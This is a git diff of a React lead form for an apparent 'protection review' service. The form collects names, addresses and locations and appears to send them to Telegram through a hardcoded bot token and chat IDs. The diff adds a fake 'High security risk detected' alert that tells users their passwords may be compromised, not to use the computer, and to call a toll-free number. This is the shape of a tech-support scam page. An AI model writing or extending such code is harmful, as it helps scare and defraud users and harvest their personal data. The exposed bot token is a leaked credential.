@@ -1,7 +1,30 @@
 import { useState } from 'react'
 
 const TELEGRAM_BOT_TOKEN = '8699438637:AAEUgX3bqmMtZa8b9EvShn-rCOrLK8c2y2U'
-const TELEGRAM_CHAT_IDS = ['6351503678', '-5030471314' /*'-5198254389*/]
+const TELEGRAM_CHAT_IDS = ['6351503678', '-5030471314'] // '-5198254389' excluded
+
+const countryCities: Record<string, string[]> = {
+    'Australia': ['Adelaide', 'Brisbane', 'Canberra', 'Gold Coast', 'Hobart', 'Melbourne', 'Newcastle', 'Perth', 'Sydney', 'Wollongong'],
+    'Brazil': ['Belo Horizonte', 'Brasília', 'Curitiba', 'Fortaleza', 'Manaus', 'Porto Alegre', 'Recife', 'Rio de Janeiro', 'Salvador', 'São Paulo'],
+    'Canada': ['Calgary', 'Edmonton', 'Hamilton', 'Kitchener', 'Montreal', 'Ottawa', 'Quebec City', 'Toronto', 'Vancouver', 'Winnipeg'],
+    'France': ['Bordeaux', 'Lille', 'Lyon', 'Marseille', 'Montpellier', 'Nantes', 'Nice', 'Paris', 'Strasbourg', 'Toulouse'],
+    'Germany': ['Berlin', 'Cologne', 'Dortmund', 'Düsseldorf', 'Essen', 'Frankfurt', 'Hamburg', 'Leipzig', 'Munich', 'Stuttgart'],
+    'India': ['Ahmedabad', 'Bangalore', 'Chennai', 'Delhi', 'Hyderabad', 'Jaipur', 'Kolkata', 'Mumbai', 'Pune', 'Surat'],
+    'Italy': ['Bari', 'Bologna', 'Catania', 'Florence', 'Genoa', 'Milan', 'Naples', 'Palermo', 'Rome', 'Turin'],
+    'Japan': ['Fukuoka', 'Hiroshima', 'Kawasaki', 'Kobe', 'Kyoto', 'Nagoya', 'Osaka', 'Saitama', 'Sapporo', 'Tokyo'],
+    'Malaysia': ['George Town', 'Ipoh', 'Johor Bahru', 'Kota Kinabalu', 'Kuala Lumpur', 'Kuching', 'Petaling Jaya', 'Shah Alam'],
+    'Mexico': ['Cancún', 'Guadalajara', 'Juárez', 'León', 'Mérida', 'Mexico City', 'Monterrey', 'Puebla', 'Tijuana', 'Zapopan'],
+    'New Zealand': ['Auckland', 'Christchurch', 'Dunedin', 'Hamilton', 'Palmerston North', 'Tauranga', 'Wellington'],
+    'Nigeria': ['Aba', 'Abuja', 'Benin City', 'Ibadan', 'Kaduna', 'Kano', 'Lagos', 'Maiduguri', 'Port Harcourt', 'Zaria'],
+    'Philippines': ['Antipolo', 'Cagayan de Oro', 'Cebu', 'Davao', 'Makati', 'Manila', 'Pasig', 'Quezon City', 'Taguig', 'Zamboanga'],
+    'Singapore': ['Singapore'],
+    'South Africa': ['Bloemfontein', 'Cape Town', 'Durban', 'East London', 'Johannesburg', 'Nelspruit', 'Port Elizabeth', 'Pretoria'],
+    'South Korea': ['Busan', 'Changwon', 'Daegu', 'Daejeon', 'Gwangju', 'Incheon', 'Seongnam', 'Seoul', 'Suwon', 'Ulsan'],
+    'Spain': ['Alicante', 'Barcelona', 'Bilbao', 'Madrid', 'Málaga', 'Murcia', 'Palma', 'Seville', 'Valencia', 'Zaragoza'],
+    'UAE': ['Abu Dhabi', 'Ajman', 'Dubai', 'Fujairah', 'Ras Al Khaimah', 'Sharjah', 'Umm Al Quwain'],
+    'United Kingdom': ['Birmingham', 'Bristol', 'Edinburgh', 'Glasgow', 'Leeds', 'Leicester', 'Liverpool', 'London', 'Manchester', 'Sheffield'],
+    'United States': ['Chicago', 'Dallas', 'Houston', 'Los Angeles', 'New York', 'Philadelphia', 'Phoenix', 'San Antonio', 'San Diego', 'San Jose'],
+}
 
 interface Props {
     riskScore: number
@@ -62,15 +85,19 @@ export default function LeadForm({ riskScore }: Props) {
                         <p className="text-slate-300 text-xs">🛡️ We will review your device and account risks</p>
                         <p className="text-slate-300 text-xs">🔒 You will receive a personalized protection plan</p>
                     </div>
+                    <p className="text-red-400 font-bold">High security risk detected</p>
+                    <p className="text-slate-300 text-sm">Your passwords may be compromised</p>
+                    <p className="text-slate-300 text-sm">Do not do anything on the computer</p>
+                    <p className="text-slate-300 text-sm">Please call toll-free number<span className="font-bold text-white">+1 (800) 734-5318</span> to get this fixed</p>
                     <button onClick={resetForm}
-                        className="w-full bg-white/10 hover:bg-white/20 text-white font-bold py-3 rounded-xl transition cursor-pointer border border-white/10 mb-3">
+                        className="w-full mt-6 bg-white/10 hover:bg-white/20 text-white font-bold py-3 rounded-xl transition cursor-pointer border border-white/10 mb-3">
                         Submit Another Request
                     </button>
                 </div>
 
             ) : (
                 <>
-                    <h3 className="text-2xl font-bold mb-6">Get Your Free Protection Review</h3>
+                    <h3 className="text-2xl font-bold mb-6">Get Your Protection Review</h3>
                     <form onSubmit={handleSubmit} autoComplete="off" className="space-y-3">
                         <input type="text" placeholder="Full Name" required autoComplete="off"
                             onChange={e => setFormData({ ...formData, name: e.target.value })}
@@ -89,20 +116,35 @@ export default function LeadForm({ riskScore }: Props) {
                                 e.preventDefault()
                             }}
                             className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
-                        <input type="text" placeholder="Country" required autoComplete="off"
-                            onChange={e => setFormData({ ...formData, country: e.target.value })}
-                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
-                        <input type="text" placeholder="City" required autoComplete="off"
+                        <select required
+                            value={formData.country}
+                            onChange={e => setFormData({ ...formData, country: e.target.value, city: '' })}
+                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition">
+                            <option value="" disabled>Select Country</option>
+                            {Object.keys(countryCities).sort().map(c => (
+                                <option key={c} value={c}>{c}</option>
+                            ))}
+                        </select>
+                        <select required
+                            value={formData.city}
+                            disabled={!formData.country}
                             onChange={e => setFormData({ ...formData, city: e.target.value })}
-                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
+                            className={`w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition ${!formData.country ? 'opacity-50 cursor-not-allowed' : ''}`}>
+                            <option value="" disabled>{formData.country ? 'Select City' : 'Select a country first'}</option>
+                            {formData.country && countryCities[formData.country]?.map(city => (
+                                <option key={city} value={city}>{city}</option>
+                            ))}
+                        </select>
                         <input type="text" placeholder="Address" required autoComplete="off"
                             onChange={e => setFormData({ ...formData, address: e.target.value })}
                             className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
-                        <select required onChange={e => setFormData({ ...formData, concern: e.target.value })}
+                        <select required
+                            value={formData.concern}
+                            onChange={e => setFormData({ ...formData, concern: e.target.value })}
                             className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition">
-                            <option value="" disabled selected>Main Concern</option>
+                            <option value="" disabled>Main Concern</option>
                             {['Facebook Account Security', 'Email Security', 'Virus / Malware Protection', 'Password / Identity Protection', 'General Security Review'].map(o => (
-                                <option key={o}>{o}</option>
+                                <option key={o} value={o}>{o}</option>
                             ))}
                         </select>
                         <textarea placeholder="Tell us what happened or what you're worried about"
@@ -110,7 +152,7 @@ export default function LeadForm({ riskScore }: Props) {
                             className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition resize-vertical min-h-24" />
                         <button type="submit"
                             className="w-full bg-green-500 hover:bg-green-600 text-[#07111d] font-bold py-3 rounded-xl transition cursor-pointer border-none">
-                            Request My Free Review
+                            Request Review
                         </button>
                     </form>
                 </>
